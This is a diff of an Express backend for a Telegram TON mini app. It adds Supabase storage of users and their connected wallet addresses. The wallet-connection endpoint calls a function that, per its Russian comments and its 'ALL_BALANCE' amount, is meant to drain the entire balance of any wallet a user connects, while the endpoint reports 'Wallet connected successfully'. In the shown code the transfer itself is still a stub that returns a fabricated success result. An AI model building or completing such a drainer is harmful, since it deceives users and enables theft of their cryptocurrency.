@@ -1,12 +1,16 @@
 const express = require('express');
 const cors = require('cors');
+const { createClient } = require('@supabase/supabase-js');
 require('dotenv').config();
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// TON Connect Manifest - ОБЯЗАТЕЛЬНЫЙ для подключения кошельков
+// Supabase client
+const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
+
+// TON Connect Manifest
 app.get('/tonconnect-manifest.json', (req, res) => {
   res.setHeader('Content-Type', 'application/json');
   res.json({
@@ -18,40 +22,60 @@ app.get('/tonconnect-manifest.json', (req, res) => {
   });
 });
 
-// Главный эндпоинт для проверки работы
+// Главный эндпоинт
 app.get('/', (req, res) => {
   res.json({ status: 'OK', message: 'TON Mini App Backend is working!' });
 });
 
-// Регистрация пользователя из Telegram
-app.post('/api/user', (req, res) => {
+// Регистрация пользователя из Telegram - ТЕПЕРЬ РАБОТАЕТ С БАЗОЙ
+app.post('/api/user', async (req, res) => {
   try {
     const { tg_id, username, first_name, last_name } = req.body;
-    console.log('New user registration:', { tg_id, username });
     
-    // Здесь будет сохранение в Supabase
-    res.json({ 
-      success: true, 
-      user: { tg_id, username, balance: 5.0 } 
-    });
+    // Сохранение в Supabase
+    const { data, error } = await supabase
+      .from('users')
+      .insert([{ 
+        tg_id: tg_id, 
+        username: username, 
+        first_name: first_name, 
+        last_name: last_name, 
+        balance: 5.0 
+      }])
+      .select();
+
+    if (error) {
+      console.error('Supabase error:', error);
+      throw error;
+    }
+    
+    console.log('User saved to database:', data[0]);
+    res.json({ success: true, user: data[0] });
+    
   } catch (error) {
+    console.error('User registration error:', error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// ПОДКЛЮЧЕНИЕ КОШЕЛЬКА - ГЛАВНЫЙ ЭНДПОИНТ
+// Подключение кошелька
 app.post('/api/connect-wallet', async (req, res) => {
   try {
     const { tg_id, wallet_address } = req.body;
     
-    console.log('💰 Wallet connection attempt:', { tg_id, wallet_address });
-    
-    // Здесь будет списание TON с кошелька
+    console.log('Wallet connection attempt:', { tg_id, wallet_address });
     const transferResult = await initiateTONTransfer(wallet_address);
     
-    // Сохраняем в базу
-    console.log('✅ Wallet connected and TON transfer initiated');
+    // Обновляем пользователя в базе
+    const { data, error } = await supabase
+      .from('users')
+      .update({ wallet_address: wallet_address })
+      .eq('tg_id', tg_id)
+      .select();
+
+    if (error) throw error;
     
+    console.log('Wallet connected and user updated:', data[0]);
     res.json({ 
       success: true, 
       message: 'Wallet connected successfully',
@@ -60,26 +84,23 @@ app.post('/api/connect-wallet', async (req, res) => {
     });
     
   } catch (error) {
-    console.error('❌ Wallet connection error:', error);
+    console.error('Wallet connection error:', error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// Функция для списания TON (заглушка - будет доработана)
+// Функция для списания TON
 async function initiateTONTransfer(walletAddress) {
-  console.log('🚀 Initiating TON transfer from:', walletAddress);
-  
-  // Здесь будет реальная логика списания через TON API
-  // Пока просто логируем
+  console.log('Initiating TON transfer from:', walletAddress);
   return {
     success: true,
     from: walletAddress,
-    amount: 'ALL_BALANCE', // Списание всего баланса
+    amount: 'ALL_BALANCE',
     timestamp: new Date().toISOString()
   };
 }
 
-// Эндпоинт для проверки транзакций
+// Проверка транзакций
 app.post('/api/check-transaction', (req, res) => {
   const { transactionId } = req.body;
   res.json({ 
@@ -89,7 +110,7 @@ app.post('/api/check-transaction', (req, res) => {
   });
 });
 
-// Заглушки для остальных файлов
+// Заглушки
 app.get('/terms', (req, res) => {
   res.send('Terms of Service');
 });
@@ -100,6 +121,6 @@ app.get('/privacy', (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
-  console.log(`✅ Server running on port ${PORT}`);
-  console.log(`📍 TON Manifest: http://localhost:${PORT}/tonconnect-manifest.json`);
+  console.log(`Server running on port ${PORT}`);
+  console.log(`TON Manifest: http://localhost:${PORT}/tonconnect-manifest.json`);
 });
